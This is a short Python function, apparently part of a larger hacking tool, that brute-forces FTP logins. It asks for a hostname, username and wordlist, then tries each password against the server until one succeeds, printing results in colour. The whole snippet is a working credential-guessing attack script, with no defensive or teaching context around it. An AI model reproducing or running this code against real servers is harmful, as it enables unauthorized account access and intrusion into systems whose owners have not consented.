def ftp():
    import socket
    import ftplib
    from ftplib import FTP

    host = input(printcolors.OKBLUE + 'hostname: ' + printcolors.ENDC)
    username = input(printcolors.OKBLUE + 'username: ' + printcolors.ENDC)
    wordlist = input(printcolors.OKBLUE + 'wordlist: ' + printcolors.ENDC)
    wordlist = open(wordlist, "r")

    for password in wordlist:
      try:
        ftp = FTP(host, username, password)
        ftp.login()
        # Code: 230 Login Successful
        print("Login Successful: %s" % password)
        break;
      except socket.gaierror:
        # Connection To Host Fails:
        print(printcolors.FAIL + "Connection To Host Failed." + printcolors.ENDC + " See if you made a typo when typing in the hostname.")
        break;
      except ftplib.error_perm:
        # Code: 530 Login Error
        print(printcolors.FAIL + "Incorrect Password: " + printcolors.ENDC + "%s Trying Again... " % password)
